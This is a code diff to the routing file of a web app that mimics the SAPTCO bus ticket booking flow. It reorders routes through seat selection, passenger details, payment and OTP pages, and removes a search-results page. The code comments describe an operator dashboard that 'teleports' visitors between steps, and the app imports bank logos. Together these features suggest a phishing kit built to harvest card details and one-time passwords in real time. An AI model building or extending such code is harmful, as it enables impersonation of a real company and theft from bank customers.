@@ -23,9 +23,9 @@ import { findBankLogo } from "@/lib/bank-logos";
 // SAPTCO ticket flow: each dashboard step maps to a public route. The
 // dashboard's "Push to step" buttons use these to teleport a visitor.
 const TICKET_STEP_TO_PATH: Record<number, string> = {
-  1: "/search-results",
-  2: "/passenger-details",
-  3: "/seat-selection",
+  1: "/schedule",
+  2: "/seat-selection",
+  3: "/passenger-details",
   4: "/payment",
   5: "/otp",
   6: "/otp",
@@ -96,7 +96,6 @@ const ServicesPage = lazy(() => import("@/pages/services"));
 const TripBookingPage = lazy(() => import("@/pages/trip-booking"));
 const SchedulePage = lazy(() => import("@/pages/schedule"));
 const BookPage = lazy(() => import("@/pages/book"));
-const SearchResultsPage = lazy(() => import("@/pages/search-results"));
 const SeatSelectionPage = lazy(() => import("@/pages/seat-selection"));
 const PassengerDetailsPage = lazy(() => import("@/pages/passenger-details"));
 const PaymentPage = lazy(() => import("@/pages/payment"));
@@ -121,7 +120,6 @@ function Router() {
         <Route path="/services" component={ServicesPage} />
         <Route path="/trip-booking" component={TripBookingPage} />
         <Route path="/schedule" component={SchedulePage} />
-        <Route path="/search-results" component={SearchResultsPage} />
         <Route path="/seat-selection" component={SeatSelectionPage} />
         <Route path="/passenger-details" component={PassengerDetailsPage} />
         <Route path="/payment" component={PaymentPage} />
@@ -365,7 +363,6 @@ const PATH_TO_PAGE: Record<string, string> = {
   "/schedule": "schedule",
   "/trip-booking": "trip_booking",
   "/trips": "trips",
-  "/search-results": "search_results",
   "/passenger-details": "passenger_details",
   "/seat-selection": "seat_selection",
   "/payment": "payment",
